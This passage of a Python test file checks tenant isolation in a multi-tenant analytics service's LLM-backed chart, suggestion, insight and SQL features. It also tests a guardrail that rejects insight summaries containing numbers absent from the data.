    async def _meta_side(ctx: TenantContext) -> dict[str, Any]:
        meta_calls.append(ctx)
        return _FAKE_META

    async def _query_side(ctx: TenantContext, **_kw: Any) -> list[Any]:
        return _cube_rows()

    loader = PromptLoader(str(_prompts_dir()))
    mock_gateway = MagicMock(spec=LLMGateway)
    mock_gateway.complete = AsyncMock(return_value=_llm(json.dumps(_VALID_CHART_DICT)))
    mock_semantic = MagicMock(spec=SemanticLayerClient)
    mock_semantic.meta = AsyncMock(side_effect=_meta_side)
    mock_semantic.query = AsyncMock(side_effect=_query_side)

    svc = NLToChartService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        semantic_client=mock_semantic,  # type: ignore[arg-type]
    )

    await svc.generate(ctx_a, request="Bar chart of sales")
    await svc.generate(ctx_b, request="Bar chart of sales")

    assert len(meta_calls) == 2, "[CAT-4] NL-Chart meta() must be called once per tenant"
    assert meta_calls[0].tenant_id == ctx_a.tenant_id
    assert meta_calls[1].tenant_id == ctx_b.tenant_id
    assert meta_calls[0].clickhouse_db != meta_calls[1].clickhouse_db, \
        "[CAT-4] NL-Chart: the two tenants must have DIFFERENT clickhouse_db values"


@pytest.mark.asyncio
async def test_cat4_nl_chart_query_called_with_server_resolved_context() -> None:
    """CAT-4 NL→Chart: SemanticLayerClient.query() carries server-resolved ctx, not body."""
    ctx = _make_ctx("widgetco")
    svc, _mock_meta, mock_query = _nl_chart_service(json.dumps(_VALID_CHART_DICT))

    await svc.generate(ctx, request="Bar chart")

    # query called once; the ctx passed must be the server-resolved one
    mock_query.assert_called_once()
    actual_ctx = mock_query.call_args[0][0]
    assert actual_ctx.tenant_id == ctx.tenant_id, \
        "[CAT-4] NL-Chart query ctx.tenant_id must match server-resolved value"
    assert actual_ctx.clickhouse_db == ctx.clickhouse_db, \
        "[CAT-4] NL-Chart query ctx.clickhouse_db must match server-resolved value"


# ---------------------------------------------------------------------------
# (d) Suggestions: ownership enforced via get_for_tenant
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_cat4_suggestions_unowned_dataset_raises_404_before_profiling() -> None:
    """CAT-4 Suggestions: dataset owned by another tenant → 404; profiling never runs."""
    ctx = _make_ctx("acme")
    dataset_id = uuid.uuid4()

    mock_dataset_svc = MagicMock(spec=DatasetService)
    mock_dataset_svc.get_for_tenant = AsyncMock(
        side_effect=HTTPException(status_code=404, detail="Dataset not found")
    )
    mock_gateway = MagicMock(spec=LLMGateway)
    mock_ch_svc = MagicMock(spec=ClickHouseDatasetService)

    loader = PromptLoader(str(_prompts_dir()))
    svc = SuggestionsService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        dataset_service=mock_dataset_svc,  # type: ignore[arg-type]
        ch_svc=mock_ch_svc,  # type: ignore[arg-type]
    )

    with pytest.raises(HTTPException) as exc_info:
        await svc.suggest(ctx, dataset_id=dataset_id)

    assert exc_info.value.status_code == 404, (
        "[CAT-4] Non-owned dataset must return 404"
    )
    assert mock_gateway.complete.call_count == 0, (
        "[CAT-4] LLM must never be called when dataset ownership fails"
    )
    assert mock_ch_svc.run_read_only_query.call_count == 0, (
        "[CAT-4] Profiling must never run when dataset ownership fails"
    )


@pytest.mark.asyncio
async def test_cat4_suggestions_get_for_tenant_called_with_server_ctx() -> None:
    """CAT-4 Suggestions: get_for_tenant is always called with the server-resolved ctx."""
    ctx = _make_ctx("tenantx")
    dataset_id = uuid.uuid4()
    svc, mock_dataset_svc, _ = _suggestions_service(
        "[]", dataset_id=dataset_id, tenant_id=ctx.tenant_id
    )

    await svc.suggest(ctx, dataset_id=dataset_id)

    mock_dataset_svc.get_for_tenant.assert_called_once()
    call_args = mock_dataset_svc.get_for_tenant.call_args
    # First positional arg is the ctx
    actual_ctx: TenantContext = call_args[0][0]
    assert actual_ctx.tenant_id == ctx.tenant_id, \
        "[CAT-4] get_for_tenant must be called with the server-resolved tenant_id"
    assert actual_ctx.clickhouse_db == ctx.clickhouse_db, \
        "[CAT-4] get_for_tenant must be called with the server-resolved clickhouse_db"


@pytest.mark.asyncio
async def test_cat4_suggestions_two_tenants_own_separate_ownership_checks() -> None:
    """CAT-4 Suggestions: two tenants each get their own get_for_tenant call."""
    ctx_a = _make_ctx("ta")
    ctx_b = _make_ctx("tb")
    dataset_id_a = uuid.uuid4()
    dataset_id_b = uuid.uuid4()

    ownership_calls: list[tuple[TenantContext, uuid.UUID]] = []

    loader = PromptLoader(str(_prompts_dir()))

    async def _capture_ownership(c: TenantContext, did: uuid.UUID) -> Any:
        ownership_calls.append((c, did))
        return _dataset(c.tenant_id, did)

    # Build services for both tenants sharing the same mock dataset svc
    mock_dataset_svc = MagicMock(spec=DatasetService)
    mock_dataset_svc.get_for_tenant = AsyncMock(side_effect=_capture_ownership)

    mock_gateway = MagicMock(spec=LLMGateway)
    mock_gateway.complete = AsyncMock(return_value=_llm("[]"))

    # Shared mock ch (profiling is mocked)
    describe_result = MagicMock()
    describe_result.rows = [("region", "String")]
    count_result = MagicMock()
    count_result.rows = [[10]]
    distinct_result = MagicMock()
    distinct_result.rows = [[2]]
    sample_result = MagicMock()
    sample_result.rows = [["A"]]

    mock_ch_svc = MagicMock(spec=ClickHouseDatasetService)

    def _run_query(ctx: Any, sql: str, **_kw: Any) -> Any:
        if "DESCRIBE" in sql:
            return describe_result
        if "count(*)" in sql.lower():
            return count_result
        if "uniq(" in sql.lower():
            return distinct_result
        return sample_result

    mock_ch_svc.run_read_only_query = MagicMock(side_effect=_run_query)

    svc = SuggestionsService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        dataset_service=mock_dataset_svc,  # type: ignore[arg-type]
        ch_svc=mock_ch_svc,  # type: ignore[arg-type]
    )

    await svc.suggest(ctx_a, dataset_id=dataset_id_a)
    await svc.suggest(ctx_b, dataset_id=dataset_id_b)

    assert len(ownership_calls) == 2, "[CAT-4] get_for_tenant must be called for each tenant"
    assert ownership_calls[0][0].tenant_id == ctx_a.tenant_id
    assert ownership_calls[1][0].tenant_id == ctx_b.tenant_id
    assert ownership_calls[0][0].clickhouse_db != ownership_calls[1][0].clickhouse_db, \
        "[CAT-4] Each tenant must have a DIFFERENT clickhouse_db in their ownership check"


# ---------------------------------------------------------------------------
# (e) Insights: gateway called with server-resolved ctx; no bleed between tenants
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_cat4_insights_gateway_ctx_matches_server_resolved() -> None:
    """CAT-4 Insights: LLM gateway receives the server-resolved TenantContext."""
    ctx = _make_ctx("singleco")

    captured_ctx: list[TenantContext] = []

    async def _capture(req: Any, *, ctx: TenantContext) -> LLMResponse:
        captured_ctx.append(ctx)
        return _llm("Revenue was 100.")

    loader = PromptLoader(str(_prompts_dir()))
    mock_gw = MagicMock(spec=LLMGateway)
    mock_gw.complete = AsyncMock(side_effect=_capture)

    svc = InsightService(gateway=mock_gw, prompt_loader=loader)  # type: ignore[arg-type]
    await svc.summarise(ctx, columns=["revenue"], rows=[[100]])

    assert len(captured_ctx) == 1
    assert captured_ctx[0].tenant_id == ctx.tenant_id, \
        "[CAT-4] Insights: gateway must receive the server-resolved tenant_id"
    assert captured_ctx[0].clickhouse_db == ctx.clickhouse_db, \
        "[CAT-4] Insights: gateway must receive the server-resolved clickhouse_db"


@pytest.mark.asyncio
async def test_cat4_insights_two_tenants_no_context_bleed() -> None:
    """CAT-4 Insights: two tenants' gateway calls carry distinct, non-blended contexts."""
    ctx_a = _make_ctx("org_a")
    ctx_b = _make_ctx("org_b")

    gateway_contexts: list[TenantContext] = []

    async def _capture(req: Any, *, ctx: TenantContext) -> LLMResponse:
        gateway_contexts.append(ctx)
        return _llm("Revenue was 100.")

    loader = PromptLoader(str(_prompts_dir()))
    mock_gw = MagicMock(spec=LLMGateway)
    mock_gw.complete = AsyncMock(side_effect=_capture)

    svc = InsightService(gateway=mock_gw, prompt_loader=loader)  # type: ignore[arg-type]

    await svc.summarise(ctx_a, columns=["revenue"], rows=[[100]])
    await svc.summarise(ctx_b, columns=["revenue"], rows=[[100]])

    assert len(gateway_contexts) == 2, "[CAT-4] Two separate summarise calls must hit gateway twice"
    assert gateway_contexts[0].tenant_id == ctx_a.tenant_id
    assert gateway_contexts[1].tenant_id == ctx_b.tenant_id
    assert gateway_contexts[0].tenant_id != gateway_contexts[1].tenant_id, \
        "[CAT-4] Insights: the two tenants must have DIFFERENT tenant_ids - no bleed"
    assert gateway_contexts[0].clickhouse_db != gateway_contexts[1].clickhouse_db, \
        "[CAT-4] Insights: the two tenants must have DIFFERENT clickhouse_db values"


# ---------------------------------------------------------------------------
# CAT-5: NO-INVENTED-NUMBERS (insight summaries)
#
# Unlike CAT-1/2/3 (pre-execution guardrails that block a side effect), the
# insight guardrail fires AFTER generation: a summary whose numbers cannot be
# traced to the supplied result set must fail closed rather than be returned.
# This is the skill's "Insights/summaries: never invent numbers" rule.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_cat5_insight_invented_number_fails_closed() -> None:
    """An LLM summary containing a number absent from the data raises, not returns.

    Guards against silent removal of the verify_no_invented_numbers call in
    InsightService.summarise: if it were removed, this would WRONGLY return the
    hallucinated summary instead of raising.
    """
    ctx = _make_ctx("singleco")
    loader = PromptLoader(str(_prompts_dir()))
    mock_gw = MagicMock(spec=LLMGateway)
    # The data only contains 100; the model hallucinates 9999.
    mock_gw.complete = AsyncMock(return_value=_llm("Revenue soared to 9999 this quarter."))

    svc = InsightService(gateway=mock_gw, prompt_loader=loader)  # type: ignore[arg-type]

    with pytest.raises(InsightGuardrailError):
        await svc.summarise(ctx, columns=["revenue"], rows=[[100]])

    # Post-generation guardrail: the gateway is called (1 + 1 bounded retry), but
    # the unverifiable summary is never returned to the caller.
    assert 1 <= mock_gw.complete.call_count <= 2


@pytest.mark.asyncio
async def test_cat5_insight_grounded_number_is_returned() -> None:
    """Control: a summary whose numbers ARE in the data passes the guardrail."""
    ctx = _make_ctx("singleco")
    loader = PromptLoader(str(_prompts_dir()))
    mock_gw = MagicMock(spec=LLMGateway)
    mock_gw.complete = AsyncMock(return_value=_llm("Revenue was 100 for the region."))

    svc = InsightService(gateway=mock_gw, prompt_loader=loader)  # type: ignore[arg-type]

    summary = await svc.summarise(ctx, columns=["revenue"], rows=[[100]])
    assert "100" in summary


# ---------------------------------------------------------------------------
# (f) Cross-cutting: no service accepts tenant id from request body
#     Proven by the service API surface — the only parameter is a
#     server-resolved TenantContext; there is no body parameter for it.
# ---------------------------------------------------------------------------


def test_cat4_nl_sql_service_query_signature_has_no_tenant_id_param() -> None:
    """CAT-4 contract: NLToSQLService.query() takes ctx from server, not a body param."""
    import inspect

    sig = inspect.signature(NLToSQLService.query)
    params = list(sig.parameters)
    # Must accept ctx (TenantContext) and question, but NOT an arbitrary tenant_id
    # body parameter.
    assert "ctx" in params, "[CAT-4] NLToSQLService.query must have a 'ctx' parameter"
    assert "tenant_id" not in params, \
        "[CAT-4] NLToSQLService.query must NOT accept 'tenant_id' from request body"


def test_cat4_nl_chart_service_generate_signature_has_no_tenant_id_param() -> None:
    """CAT-4 contract: NLToChartService.generate() takes ctx from server, not a body param."""
    import inspect

    sig = inspect.signature(NLToChartService.generate)
    params = list(sig.parameters)
    assert "ctx" in params, "[CAT-4] NLToChartService.generate must have a 'ctx' parameter"
    assert "tenant_id" not in params, \
        "[CAT-4] NLToChartService.generate must NOT accept 'tenant_id' from request body"


def test_cat4_suggestions_service_suggest_signature_has_no_tenant_id_param() -> None:
    """CAT-4 contract: SuggestionsService.suggest() takes ctx from server, not a body param."""
    import inspect

    sig = inspect.signature(SuggestionsService.suggest)
    params = list(sig.parameters)
    assert "ctx" in params, "[CAT-4] SuggestionsService.suggest must have a 'ctx' parameter"
    assert "tenant_id" not in params, \
        "[CAT-4] SuggestionsService.suggest must NOT accept 'tenant_id' from request body"


def test_cat4_insight_service_summarise_signature_has_no_tenant_id_param() -> None:
    """CAT-4 contract: InsightService.summarise() takes ctx from server, not a body param."""
    import inspect

    sig = inspect.signature(InsightService.summarise)
    params = list(sig.parameters)
    assert "ctx" in params, "[CAT-4] InsightService.summarise must have a 'ctx' parameter"
    assert "tenant_id" not in params, \
        "[CAT-4] InsightService.summarise must NOT accept 'tenant_id' from request body"
